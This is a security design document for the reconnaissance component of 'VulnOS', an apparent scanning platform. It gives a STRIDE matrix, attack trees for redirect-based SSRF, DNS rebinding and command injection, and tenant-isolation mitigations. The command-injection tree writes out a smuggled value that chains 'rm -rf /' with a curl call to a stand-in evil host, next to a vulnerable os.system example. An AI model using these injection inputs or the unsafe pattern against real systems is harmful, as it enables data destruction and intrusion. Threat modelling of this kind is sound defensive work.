# VulnOS — P3.1.2 Reconnaissance Threat Model & Attack Surface Analysis
## STRIDE Analysis, Attack Trees & Defensive Countermeasures

**Date:** 2026-11-02  
**Milestone:** P3.1.2  
**Status:** Canonical Design  
**Author:** Principal Security Architect & Senior Backend Engineer  

---

## 1. Scope & System Boundaries

This threat model analyzes the reconnaissance subsystem of VulnOS. The reconnaissance system sits at the intersection of the external internet (target web applications and third-party threat intelligence APIs) and the internal VulnOS infrastructure (PostgreSQL database, Redis message queue, S3 evidence storage).

### Key Trust Zones:
1. **Zone 0 (Hostile / Untrusted):** External targets, third-party DNS servers, public certificate transparency logs, web pages, and API endpoints.
2. **Zone 1 (Semi-Trusted / Sandboxed):** Worker execution containers running security tools and parsing target responses.
3. **Zone 2 (Trusted Control Plane):** FastAPI application, Recon Orchestrator, Deterministic Scope Engine, Celery task broker, and Egress Guard.
4. **Zone 3 (Authoritative Data Storage):** PostgreSQL 16 database, Redis cluster, S3-compatible evidence storage.

---

## 2. STRIDE Threat Matrix

| Threat Category | Threat Description | Vulnerable Component | Likelihood | Impact | Defensive Countermeasure |
|---|---|---|---|---|---|
| **Spoofing** | Worker attempts to impersonate orchestrator or report false task status. | Task Queue / API | Low | High | Cryptographically signed `WorkerTaskEnvelope` and verified `WorkerTaskResult` with HMAC token. |
| **Tampering** | Malicious target returns crafted content that exploits tool buffer overflow to modify memory. | Security Tool Container | Medium | High | Read-only root filesystem, drop all Linux capabilities, non-root user execution, memory limits. |
| **Repudiation** | Operator denies initiating an active scan against a specific host. | API / Audit Log | Low | High | Append-only `audit_logs` and `scope_decisions` capturing authenticated `user_id`, IP, policy hash, and timestamp. |
| **Information Disclosure** | Tool stdout leaks client database passwords or API keys. | Tool Execution Output | Medium | Critical | Worker envelopes contain only opaque `secret_ref_id`; streaming normalizer scrubs sensitive keys. |
| **Denial of Service** | Target returns infinite HTTP stream or recursive zip bomb. | Worker / S3 Storage | High | Medium | Hard response size cutoff (10MB stdout, 5MB body), per-task wall-clock timeout (300s), memory limits. |
| **Elevation of Privilege** | Worker attempts container escape via Docker socket or kernel exploit. | Host Environment | Low | Critical | `/var/run/docker.sock` is NOT mounted; `no-new-privileges: true`; `UID 10001:10001`. |

---

## 3. Detailed Attack Trees & Countermeasures

### 3.1 Attack Tree: Scope Escape via HTTP Redirection
```text
Goal: Coerce VulnOS into attacking an unauthorized internal service (e.g. AWS IMDS or internal DB)
|
+-- 1. Attacker controls target endpoint https://example.com/redirect
    |
    +-- 2. Target responds with 302 Found -> Location: http://169.254.169.254/latest/meta-data/
    |   |
    |   +-- [Countermeasure] Egress Proxy intercepts 3xx responses.
    |   +-- [Countermeasure] Re-evaluates target URL with classify_ip_address().
    |   +-- [Defense Result] Request blocked; task transitions to 'scope_violation'.
    |
    +-- 3. Target responds with 302 Found -> Location: http://internal-billing.acme.local/
        |
        +-- [Countermeasure] Proxy resolves domain; detects RFC 1918 private IP.
        +-- [Countermeasure] Checks AuthorizationRecord.allow_private_ranges.
        +-- [Defense Result] Blocked unless explicitly permitted in legal consent.
```

### 3.2 Attack Tree: DNS Rebinding Attack
```text
Goal: Bypass orchestrator scope check using time-of-check to time-of-use (TOCTOU) DNS manipulation
|
+-- 1. Attacker registers rebind.attacker.com with TTL = 1 second.
|
+-- 2. Pre-dispatch scope check resolves rebind.attacker.com -> 203.0.113.5 (Public IP, Allowed).
|
+-- 3. Worker initiates tool run. Attacker updates DNS server -> 127.0.0.1.
|
+-- 4. Tool queries local DNS and attempts connection to localhost:5432 (PostgreSQL).
    |
    +-- [Countermeasure] Workers have NO direct internet or DNS access.
    +-- [Countermeasure] Egress Proxy resolves DNS internally, pins resolved IP to socket.
    +-- [Countermeasure] Proxy blocks loopback/internal IP addresses regardless of hostname.
    +-- [Defense Result] Connection rejected at proxy before socket establishment.
```

### 3.3 Attack Tree: Command Injection via Target Input
```text
Goal: Execute arbitrary commands on worker container by embedding shell metacharacters in target attributes
|
+-- 1. Attacker controls domain name or banner containing shell metacharacters:
|      `example.com; rm -rf /; curl http://evil.com/`
|
+-- 2. Worker executes tool: subfinder -d <target>
|   |
|   +-- [Vulnerable Design] os.system(f"subfinder -d {target}") -> Code Execution!
|   +-- [VulnOS Design] Command is constructed as an argv list:
|       ["subfinder", "-d", target] passed to execve() / asyncio.create_subprocess_exec().
|   +-- [Defense Result] Shell is never invoked (`shell=False`). Metacharacters are passed
|       literally to the tool as a domain argument and rejected by domain validation grammar.
```

---

## 4. Multi-Tenant Cross-Contamination Analysis

1. **Foreign Key Cross-Pollination:**
   - A malicious tenant creates a Recon Job referencing an `AuthorizationRecord` or `Target` from another project.
   - **Mitigation:** The Orchestrator validates all entity ownership against `app.current_project_id`. If an ID belongs to another tenant, it raises `404 Not Found` (never `403 Forbidden`) to prevent resource enumeration.
2. **Database Connection Pool Leakage:**
   - A database connection is recycled across tenants with stale session state.
   - **Mitigation:** SQLAlchemy connection checkout listeners execute `RESET ALL;` upon every checkout and checkin, clearing transaction-local `app.current_project_id`.
3. **Queue Channel Isolation:**
   - Worker consumes a task for Project A but leaks artifacts into Project B.
   - **Mitigation:** `WorkerTaskEnvelope` embeds `project_id`. The Result Normalizer asserts `result.project_id == envelope.project_id` before invoking asset ingestion.
